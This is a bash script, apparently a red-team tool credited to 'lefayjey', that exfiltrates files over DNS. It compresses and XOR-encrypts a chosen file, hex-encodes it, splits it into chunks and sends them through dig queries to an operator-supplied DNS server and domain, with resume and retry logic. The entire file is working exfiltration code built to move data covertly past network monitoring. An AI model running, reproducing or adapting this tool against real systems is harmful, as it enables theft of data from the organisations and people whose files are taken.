#!/bin/bash
# Title: DNS Exfiltration Tool
# Author: lefayjey

function show_help {
    echo "Usage: ./exfil_client.sh -f <file_path> -p <password> [-d <domain>] [-s <dns_server_ip>] [-t]"
    echo "Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries."
    echo ""
    echo "Parameters:"
    echo "  -f  Path to the file you want to exfiltrate."
    echo "  -p  Password to be used in XOR encryption."
    echo "  -d  Domain to use in DNS queries."
    echo "  -s  IP address of the DNS server."
    echo "  -t  Use TCP instead of UDP."
    echo ""
    echo "Example:"
    echo './exfil_client.sh -f "/path/to/your/file" -d "example.com" -s "8.8.8.8" -p "securepass" -t'
}

while getopts "f:p:d:s:th" opt; do
    case ${opt} in
    f) FilePath=$OPTARG ;;
    p) Password=$OPTARG ;;
    d) Domain=$OPTARG ;;
    s) DnsServerIp=$OPTARG ;;
    t) tcp="+tcp" ;;
    h)
        show_help
        exit 0
        ;;
    \?)
        show_help
        exit 1
        ;;
    esac
done

if [[ -z "$FilePath" || -z "$Password" || ! -f "$FilePath" ]]; then
    show_help
    exit 1
fi

echo "       __                     _____ __         ___            __ "
echo "  ____/ /___  ________  _  __/ __(_) /   _____/ (_)__  ____  / /_"
echo " / __  / __ \/ ___/ _ \| |/_/ /_/ / /   / ___/ / / _ \/ __ \/ __/"
echo "/ /_/ / / / (__  )  __/>  </ __/ / /   / /__/ / /  __/ / / / /_  "
echo "\__,_/_/ /_/____/\___/_/|_/_/ /_/_/____\___/_/_/\___/_/ /_/\__/  "
echo "                                 /_____/                         "
echo ""
echo "Author: lefayjey"
echo "Version: 1.2.0"
echo ""

# Get filename from FilePath
filename=$(basename "$FilePath")
status_file="${filename}_transfer_status.log"

# Calculate MD5 checksum
md5_checksum=$(md5sum "$FilePath" | awk '{ print $1 }')
echo "[+] MD5 checksum: [$md5_checksum $FilePath]"
randnum=$(tr -dc '0-9' < /dev/urandom | head -c 7)

chunk_id=0

# Check if status file exists
if [ -f "$status_file" ]; then
    echo "[!] A previous transfer was interrupted: $(cat "$status_file")"
    read -rp "[?] Do you want to resume the transfer? (yes/no): " resume
    if [ "$resume" != "yes" ]; then
        rm -f "$status_file"
    else
        status=$(cat "$status_file")
        chunk_id=$(echo "$status" | jq -r '.chunk_id')
        randnum=$(echo "$status" | jq -r '.randnum')
        resumed_md5_checksum=$(echo "$status" | jq -r '.md5_checksum')
        if [ "${resumed_md5_checksum^^}" != "${md5_checksum^^}" ]; then
            echo "[!] File has changed. Starting a new transfer."
            rm -f "$status_file"
        fi
    fi
fi

echo "[*] Encrypting file, please wait..."
# XOR encrypt compressed data with password
encrypted_data=$(gzip -c "$FilePath" | xortool-xor -n -s "$Password" -f - | hexdump -v -e '/1 "%02x"')

# Maximum DNS query size constraints
request_max_size=255

# Calculate space required for domain name and metadata
domain_name_length=$((${#Domain} + 3)) #including the dots
encrypted_filename=$(echo -n "$filename" | xortool-xor -n -s "$Password" -f - | xxd -p)
metadata_length=$((${#encrypted_filename} + 23)) #including the dots, and the metadata separators, Maximum of 100000 chunks = 20 MB

# Calculate maximum bytes available for data in each DNS query
chunks_bytes=$((request_max_size - metadata_length - domain_name_length))

# Calculate number of chunks
nb_chunks=$((${#encrypted_data} / chunks_bytes + 1))

# Construct metadata
metadata="$encrypted_filename|$randnum|$nb_chunks"

echo "[+] Maximum data exfiltrated per DNS request (chunk max size): [$chunks_bytes] bytes"
echo "[+] Number of chunks: [$nb_chunks]"

# Calculate start index based on chunk_id
start_index=$((chunk_id * chunks_bytes))

echo "[*] Sending file, please wait..."

while [[ $chunk_id -lt $nb_chunks ]]; do
    end_index=$((start_index + chunks_bytes))
    chunk=${encrypted_data:$start_index:chunks_bytes}

    # Split chunk into 4 equal chunks
    chunk_length=$(((${#chunk} + 3) / 4)) #chunk_max_size=63
    chunks=()
    for ((i = 0; i < 4; i++)); do
        chunks[i]=${chunk:$((i * chunk_length)):chunk_length}
    done

    # Construct DNS query
    dnsquery="$chunk_id.${chunks[0]}.${chunks[1]}.${chunks[2]}.${chunks[3]}.$metadata.$Domain"

    # Retry logic for DNS query
    max_retries=5
    retry_count=0
    success=false

    while [[ $retry_count -lt $max_retries && $success == false ]]; do
        if dig $tcp +short "$dnsquery" @"$DnsServerIp" >/dev/null 2>&1; then
            success=true
        else
            retry_count=$((retry_count + 1))
            echo "[*] Timeout occurred, retrying $retry_count/$max_retries..."
            sleep 3
        fi
    done

    if [[ $success == false ]]; then
        echo "[!] Failed to send DNS query after multiple retries."
        exit 1
    fi

    # Update status file
    status=$(jq -n --arg chunk_id "$chunk_id" --arg randnum "$randnum" --arg file "$filename" --arg md5_checksum "$md5_checksum" \
        '{chunk_id: $chunk_id, randnum: $randnum, file: $file, md5_checksum: $md5_checksum}')
    echo "$status" >"$status_file"

    printf "%4d%%\r" $((100 * chunk_id / nb_chunks))

    # Move to next chunk
    chunk_id=$((chunk_id + 1))
    start_index=$end_index
done

# Clean up status file after successful transfer
rm "$status_file"

echo "[+] Transfer complete!"
